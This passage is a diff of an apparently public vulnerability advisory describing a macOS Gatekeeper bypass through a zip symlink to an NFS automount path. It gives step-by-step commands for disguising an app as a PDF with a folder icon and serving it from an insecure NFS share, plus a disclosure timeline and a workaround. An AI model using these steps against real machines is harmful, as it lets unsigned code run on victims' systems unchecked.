@@ -37,24 +37,41 @@ https://youtu.be/m74cpadIPZY
 PoC
 In order to reproduce this issue, follow the steps below:
 
-create a zip file with a symlink to an automount endpoint
+1. create a zip file with a symlink to an automount endpoint
+
 mkdir Documents
+
 ln -s /net/linux-vm.local/nfs/Documents Documents/Documents
+
 zip -ry Documents.zip Documents
-create an application (.app folder) with the code you want to run
+
+2. create an application (.app folder) with the code you want to run
+
 cp -r /Applications/Calculator.app PDF.app
+
 echo -e '#!/bin/bash'"\n"'open /Applications/iTunes.app' > PDF.app/Contents/MacOS/Calculator
 chmod +x PDF.app/Contents/MacOS/Calculator
+
 rm PDF.app/Contents/Resources/AppIcon.icns
+
 ln -s /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/GenericFolderIcon.icns PDF.app/Contents/Resources/AppIcon.icns
-create a publicily accessible NFS share and put the .app in it
+
+3. create a publicily accessible NFS share and put the .app in it
+
 ssh linux-vm.local
+
 mkdir -p /nfs/Documents
+
 echo '/nfs/Documents *(insecure,rw,no_root_squash,anonuid=1000,anongid=1000,async,nohide)' >> /etc/exports
+
 service nfs-kernel-server restart
+
 scp -r mymac.local:PDF.app /nfs/Documents/
+
 upload the zip somewhere in internet and download it so it gets the quarantine flag used by Gatekeeper
+
 extract the zip (if needed) and navigate it
+
 HISTORY
 The vendor has been contacted on February 22th 2019 and it's aware of this issue. This issue was supposed to be addressed, according to the vendor, on May 15th 2019 but Apple started dropping my emails.
 Since Apple is aware of my 90 days disclosure deadline, I make this information public.
@@ -65,5 +82,7 @@ No solution is available yet.
 A possible workaround is to disable automount:
 
 Edit /etc/auto_master as root
+
 Comment the line beginning with '/net'
+
 Reboot
